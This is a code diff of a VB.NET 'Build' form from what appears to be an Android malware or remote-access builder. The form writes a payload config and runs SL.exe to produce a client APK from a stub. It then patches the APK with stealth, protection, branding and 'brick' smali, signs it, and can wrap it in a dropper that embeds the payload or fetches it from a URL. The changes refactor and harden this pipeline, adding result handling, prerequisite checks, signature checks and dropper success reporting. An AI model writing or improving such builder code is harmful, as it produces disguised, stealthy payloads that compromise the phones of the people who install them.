@@ -69,12 +69,10 @@ Partial Public Class Build
             Return
         End If
         Dim strArrays As String() = File.ReadAllLines(str)
-        If (CInt(strArrays.Length) >= 10) Then
-            Dim length As Integer = CInt(strArrays.Length)
-            Dim num As Integer = 0
-            While num <= length
-                If (num <= 10) Then
-                    Select Case num
+        If strArrays.Length >= 10 Then
+            Dim lastIndex As Integer = Math.Min(strArrays.Length - 1, 10)
+            For num As Integer = 0 To lastIndex
+                Select Case num
                         Case 0
                             If (Not File.Exists(strArrays(num))) Then
                                 Dim str1 As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
@@ -130,19 +128,20 @@ Partial Public Class Build
                             End If
                             Exit Select
                         Case 8
-                            If (strArrays(num)(0) = "1"c) Then
+                            Dim permFlags As String = strArrays(num)
+                            If permFlags.Length > 0 AndAlso permFlags(0) = "1"c Then
                                 Me.c1()
                             End If
-                            If (strArrays(num)(1) = "1"c) Then
+                            If permFlags.Length > 1 AndAlso permFlags(1) = "1"c Then
                                 Me.c2()
                             End If
-                            If (strArrays(num)(2) = "1"c) Then
+                            If permFlags.Length > 2 AndAlso permFlags(2) = "1"c Then
                                 Me.c3()
                             End If
-                            If (strArrays(num)(3) = "1"c) Then
+                            If permFlags.Length > 3 AndAlso permFlags(3) = "1"c Then
                                 Me.c4()
                             End If
-                            If (strArrays(num)(4) = "1"c) Then
+                            If permFlags.Length > 4 AndAlso permFlags(4) = "1"c Then
                                 Me.c5()
                             End If
                             Exit Select
@@ -169,12 +168,8 @@ Partial Public Class Build
                                 Me.TextBox8.Text = ".."
                             End If
                             Exit Select
-                    End Select
-                    num = num + 1
-                Else
-                    Exit While
-                End If
-            End While
+                End Select
+            Next
         End If
         Me.PBil.ImageLocation = String.Concat(Store.Resources(1), "\Icons\Payload\Bi.png")
         Me.Trans.Interval = Store.transparency
@@ -227,13 +222,13 @@ Partial Public Class Build
 
     Private Sub SaveDropperSettings()
         Try
-            My.Settings("DropperMode") = IsDropperEnabled().ToString()
-            My.Settings("TemplatePath") = txtDropperTemplatePath.Text
-            My.Settings("PayloadUrl") = txtPayloadUrl.Text
+            My.Settings.DropperMode = IsDropperEnabled().ToString()
+            My.Settings.TemplatePath = txtDropperTemplatePath.Text
+            My.Settings.PayloadUrl = txtPayloadUrl.Text
             If cbDropperStyle.SelectedItem IsNot Nothing Then
-                My.Settings("DropperStyle") = cbDropperStyle.SelectedItem.ToString()
+                My.Settings.DropperStyle = cbDropperStyle.SelectedItem.ToString()
             End If
-            My.Settings("EmbedPayload") = chkEmbedPayload.Checked.ToString()
+            My.Settings.EmbedPayload = chkEmbedPayload.Checked.ToString()
             My.Settings.Save()
         Catch
         End Try
@@ -241,22 +236,25 @@ Partial Public Class Build
 
     Private Sub LoadDropperSettings()
         Try
-            Dim enabled As Boolean = Convert.ToBoolean(If(My.Settings("DropperMode") IsNot Nothing, My.Settings("DropperMode").ToString(), "False"))
+            Dim enabled As Boolean = False
+            Boolean.TryParse(My.Settings.DropperMode, enabled)
             chkDropperMode_Dropper.Checked = enabled
 
-            If My.Settings("TemplatePath") IsNot Nothing Then
-                txtDropperTemplatePath.Text = My.Settings("TemplatePath").ToString()
+            If Not String.IsNullOrWhiteSpace(My.Settings.TemplatePath) Then
+                txtDropperTemplatePath.Text = My.Settings.TemplatePath
             End If
-            If My.Settings("PayloadUrl") IsNot Nothing Then
-                txtPayloadUrl.Text = My.Settings("PayloadUrl").ToString()
+            If Not String.IsNullOrWhiteSpace(My.Settings.PayloadUrl) Then
+                txtPayloadUrl.Text = My.Settings.PayloadUrl
             End If
-            If My.Settings("DropperStyle") IsNot Nothing Then
-                Dim idx As Integer = cbDropperStyle.Items.IndexOf(My.Settings("DropperStyle").ToString())
+            If Not String.IsNullOrWhiteSpace(My.Settings.DropperStyle) Then
+                Dim idx As Integer = cbDropperStyle.Items.IndexOf(My.Settings.DropperStyle)
                 If idx >= 0 Then cbDropperStyle.SelectedIndex = idx
             ElseIf cbDropperStyle.Items.Count > 0 AndAlso cbDropperStyle.SelectedIndex = -1 Then
                 cbDropperStyle.SelectedIndex = 0
             End If
-            chkEmbedPayload.Checked = Convert.ToBoolean(If(My.Settings("EmbedPayload") IsNot Nothing, My.Settings("EmbedPayload").ToString(), "True"))
+            Dim embed As Boolean = True
+            Boolean.TryParse(My.Settings.EmbedPayload, embed)
+            chkEmbedPayload.Checked = embed
             SetDropperChildControlsEnabled(grpDropper_Dropper, enabled)
         Catch
         End Try
@@ -393,31 +391,58 @@ Partial Public Class Build
         }
     End Function
 
-    Private Function RunSlExeAndWait(slExe As String) As Boolean
+    Private Function RunSlExeAndWait(slExe As String, resourcesPath As String) As ApkNotifyPatcher.SlBuildResult
+        Dim result As New ApkNotifyPatcher.SlBuildResult With {.Success = False}
         Try
-            Dim psi As New ProcessStartInfo(slExe, " n -160")
-            psi.WorkingDirectory = Path.GetDirectoryName(slExe)
-            psi.WindowStyle = ProcessWindowStyle.Hidden
-            psi.UseShellExecute = False
-            psi.CreateNoWindow = True
-            Using p As Process = Process.Start(psi)
-                If Not p.WaitForExit(180000) Then
-                    Try
-                        p.Kill()
-                    Catch
-                    End Try
-                    MessageBox.Show("SL.exe build timed out after 3 minutes.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-                    Return False
-                End If
-                If p.ExitCode <> 0 Then
-                    MessageBox.Show("SL.exe exited with code " & p.ExitCode.ToString() & ". Check Payload\s.inf and Java/apktool in Building-6.1.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-                    Return False
-                End If
-            End Using
-            Return True
+            Dim prereqErr As String = Nothing
+            If Not ApkNotifyPatcher.EnsureSlBuildPrerequisites(resourcesPath, prereqErr) Then
+                result.ErrorMessage = prereqErr
+                Return result
+            End If
+
+            Dim buildStartedUtc As DateTime = DateTime.UtcNow
+            Dim psi As New ProcessStartInfo() With {
+                .FileName = slExe,
+                .Arguments = "n -160",
+                .WorkingDirectory = Path.GetDirectoryName(slExe),
+                .WindowStyle = ProcessWindowStyle.Hidden,
+                .UseShellExecute = True,
+                .CreateNoWindow = True
+            }
+
+            Dim slProcess As Process = Process.Start(psi)
+            If slProcess Is Nothing Then
+                result.ErrorMessage = "Failed to start SL.exe"
+                Return result
+            End If
+
+            Dim outputApk As String = ApkNotifyPatcher.WaitForSlBuildOutput(resourcesPath, 180000, buildStartedUtc)
+            If ApkNotifyPatcher.IsValidApkFile(outputApk) Then
+                result.Success = True
+                result.OutputPath = outputApk
+                Try
+                    If Not slProcess.HasExited Then slProcess.CloseMainWindow()
+                Catch
+                End Try
+                Return result
+            End If
+
+            If Not slProcess.HasExited Then
+                Try
+                    slProcess.WaitForExit(5000)
+                Catch
+                End Try
+            End If
+
+            If slProcess.HasExited AndAlso slProcess.ExitCode <> 0 Then
+                result.ErrorMessage = "SL.exe exited with code " & slProcess.ExitCode.ToString()
+            Else
+                result.ErrorMessage = "SL.exe finished but no client APK was produced — check stub.apk, Java and apktool in Building-6.1\apktool"
+            End If
+            Return result
         Catch ex As Exception
-            MessageBox.Show("SL.exe failed: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-            Return False
+            result.ErrorMessage = "SL.exe failed: " & ex.Message
+            Return result
         End Try
     End Function
 
@@ -446,9 +471,52 @@ Partial Public Class Build
         Return text
     End Function
 
+    Private Function EnsureBuildIconPath() As String
+        Dim current As String = Nothing
+        Try
+            current = TryCast(Me.Label1.Tag, String)
+        Catch
+        End Try
+        If Not String.IsNullOrWhiteSpace(current) AndAlso File.Exists(current) Then Return current
+
+        Dim defaultIcon As String = Path.Combine(Store.Resources(1), "Icons", "devico", "gp.png")
+        If File.Exists(defaultIcon) Then
+            Me.Label1.Tag = defaultIcon
+            Me.PictureBox1.ImageLocation = defaultIcon
+            Me.Label1.Text = "default"
+            Me.ThemeButton1.Tag = "0"
+            Me.ThemeButton1.Text = "Select icon"
+            Return defaultIcon
+        End If
+        Return String.Empty
+    End Function
+
+    Private Sub WriteBuildInf(iconPath As String)
+        Dim stringBuilder As New StringBuilder()
+        stringBuilder.AppendLine(If(String.IsNullOrWhiteSpace(iconPath), Path.Combine(Store.Resources(1), "Icons", "devico", "gp.png"), iconPath))
+        stringBuilder.AppendLine(Me.TextBox1.Text)
+        stringBuilder.AppendLine(Me.TextBox2.Text)
+        stringBuilder.AppendLine(Me.TextBox3.Text)
+        stringBuilder.AppendLine(Me.TextBox4.Text)
+        stringBuilder.AppendLine(Me.TextBox5.Text)
+        stringBuilder.AppendLine(Me.TextBox6.Text)
+        stringBuilder.AppendLine(Me.TextBox7.Text)
+        stringBuilder.AppendLine(BuildPermissionFlags())
+        stringBuilder.AppendLine(Me.Label14.Text)
+        stringBuilder.AppendLine(Me.TextBox8.Text)
+
+        Dim payloadInf As String = Path.Combine(Store.Resources(1), "Imports", "Payload", "s.inf")
+        File.WriteAllText(payloadInf, stringBuilder.ToString(), New UTF8Encoding(False))
+    End Sub
+
     Private Sub ApplyApkNotifyPatch(notifyCfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, resourcesPath As String, packageName As String, aesKey As Byte(), appName As String, iconPath As String)
         Dim patchErrors As New List(Of String)
-        Dim distApkPath As String = ApkNotifyPatcher.WaitForDistApk(resourcesPath)
+        Dim finalizeErr As String = Nothing
+        If Not ApkNotifyPatcher.TryFinalizeSlBuild(resourcesPath, finalizeErr) Then
+            patchErrors.Add(If(String.IsNullOrWhiteSpace(finalizeErr), "Client rebuild failed after SL.exe", finalizeErr))
+        End If
+
+        Dim distApkPath As String = ApkNotifyPatcher.WaitForSlBuildOutput(resourcesPath, 5000)
         distApkPath = ApkNotifyPatcher.NormalizeDistApkPath(resourcesPath)
         Dim clientApkPath As String = ApkNotifyPatcher.EnsureClientOutputDirectory()
         Dim patchFailed As Boolean = False
@@ -456,13 +524,21 @@ Partial Public Class Build
         Dim patchReport As ApkNotifyPatcher.NotifyPatchReport = Nothing
         Dim dropperReport As ApkDropperPatcher.DropperBuildReport = Nothing
 
-        Dim needPatch As Boolean = notifyCfg.Enabled OrElse ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg) OrElse (protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled)
+        Dim brandingCfg As ApkBrandingPatcher.ClientBrandingConfig = ApkBrandingPatcher.BuildBrandingConfigFromUi(
+            iconPath, Me.TextBox5.Text, Me.TextBox2.Text, Me.TextBox4.Text, Me.TextBox1.Text, Me.TextBox6.Text, Me.TextBox7.Text, Me.TextBox3.Text)
 
-        If Not File.Exists(distApkPath) Then
+        Dim needPatch As Boolean = notifyCfg.Enabled OrElse
+            ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg) OrElse
+            (protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled) OrElse
+            brandingCfg.HasContent() OrElse
+            ApkBrandingPatcher.ApkContainsBrandingPlaceholders(distApkPath) OrElse
+            Directory.Exists(Path.Combine(resourcesPath, "brick_smali"))
+
+        If Not ApkNotifyPatcher.IsValidApkFile(distApkPath) Then
             patchErrors.Add("Unsigned APK not found after SL.exe build: " & distApkPath)
         ElseIf needPatch Then
             Dim patchErr As String = Nothing
-            patchSucceeded = ApkNotifyPatcher.TryPatchApk(distApkPath, notifyCfg, protectionCfg, patchErr)
+            patchSucceeded = ApkNotifyPatcher.TryPatchApk(distApkPath, notifyCfg, protectionCfg, patchErr, brandingCfg, resourcesPath)
             patchReport = ApkNotifyPatcher.GetLastNotifyPatchReport()
             If Not patchSucceeded Then
                 patchFailed = True
@@ -490,6 +566,8 @@ Partial Public Class Build
         Dim signErr As String = Nothing
         If File.Exists(distApkPath) AndAlso Not ApkNotifyPatcher.TrySignDistToClient(signErr, resourcesPath) Then
             patchErrors.Add(FormatBuildIssue("sign: " & signErr))
+        ElseIf File.Exists(clientApkPath) AndAlso Not ApkNotifyPatcher.ApkLooksSigned(clientApkPath) Then
+            patchErrors.Add("Client APK built but signature missing — check SignApk.jar in Building-6.1\\apktool")
         End If
 
         If IsDropperEnabled() AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath) Then
@@ -507,7 +585,7 @@ Partial Public Class Build
         End If
 
         Dim summary As New BuildResultSummary With {
-            .Success = patchErrors.Count = 0 AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath),
+            .Success = patchErrors.Count = 0 AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath) AndAlso (Not IsDropperEnabled() OrElse (dropperReport IsNot Nothing AndAlso dropperReport.Success)),
             .ApkPath = clientApkPath,
             .ApkSizeKb = apkSizeKb,
             .NotifyEnabled = notifyCfg.Enabled,
@@ -580,40 +658,20 @@ Partial Public Class Build
                 packageName = protectionCfg.PackageName.Trim()
             End If
             Dim aesKey As Byte() = GenerateAESKey(packageName)
+            Dim iconPath As String = EnsureBuildIconPath()
             Dim appName As String = Me.TextBox2.Text
-            Dim iconPath As String = Me.Label1.Tag?.ToString()
 
-            ' ---- Остальной код билда (как было) ----
-            Dim stringBuilder As New StringBuilder()
-            stringBuilder.Append(Operators.ConcatenateObject(Me.Label1.Tag, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox1.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox2.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox3.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox4.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox5.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox6.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox7.Text, "" & vbCrLf & ""))
-            Dim str As String = BuildPermissionFlags()
-            stringBuilder.Append(String.Concat(str, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.Label14.Text, "" & vbCrLf & ""))
-            stringBuilder.Append(String.Concat(Me.TextBox8.Text, "" & vbCrLf & ""))
-            Dim sInfPath As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
+            WriteBuildInf(iconPath)
+            Dim sInfPath As String = Path.Combine(Store.Resources(1), "Imports", "Payload", "s.inf")
             Dim notifyCfg = GetNotifyConfigFromUi()
             protectionCfg.PermissionFlags = BuildPermissionFlags()
 
             If File.Exists(sInfPath) Then
-                Using sw As New StreamWriter(sInfPath)
-                    sw.Write(stringBuilder.ToString())
-                End Using
                 Dim slExe As String = String.Concat(Store.Resources(1), "\Imports\Payload\SL.exe")
-                Dim slOk As Boolean = True
+                Dim slResult As ApkNotifyPatcher.SlBuildResult = Nothing
                 If File.Exists(slExe) Then
-                    slOk = RunSlExeAndWait(slExe)
+                    slResult = RunSlExeAndWait(slExe, Store.Resources(1))
                 Else
-                    slOk = False
-                    MessageBox.Show("SL.exe not found in Payload folder.", "Build", MessageBoxButtons.OK, MessageBoxIcon.Warning)
-                End If
-                If Not slOk Then
                     Dim failSummary As New BuildResultSummary With {
                         .Success = False,
                         .ApkPath = ApkNotifyPatcher.GetBuildingClientApkPath(),
@@ -621,7 +679,22 @@ Partial Public Class Build
                         .ProtectionEnabled = protectionCfg.Enabled,
                         .DropperEnabled = IsDropperEnabled()
                     }
-                    failSummary.Errors = New List(Of String) From {"SL.exe build failed — check Java, apktool and Payload\s.inf"}
+                    failSummary.Errors = New List(Of String) From {"SL.exe not found in Payload folder"}
+                    BuildResultDialog.ShowResult(Me, failSummary)
+                    Return
+                End If
+                If slResult Is Nothing OrElse Not slResult.Success Then
+                    Dim failSummary As New BuildResultSummary With {
+                        .Success = False,
+                        .ApkPath = ApkNotifyPatcher.GetBuildingClientApkPath(),
+                        .NotifyEnabled = notifyCfg.Enabled,
+                        .ProtectionEnabled = protectionCfg.Enabled,
+                        .DropperEnabled = IsDropperEnabled()
+                    }
+                    Dim slErr As String = If(slResult IsNot Nothing AndAlso Not String.IsNullOrWhiteSpace(slResult.ErrorMessage),
+                        slResult.ErrorMessage,
+                        "SL.exe build failed — check Java, stub.apk and Payload\s.inf")
+                    failSummary.Errors = New List(Of String) From {slErr}
                     BuildResultDialog.ShowResult(Me, failSummary)
                     Return
                 End If
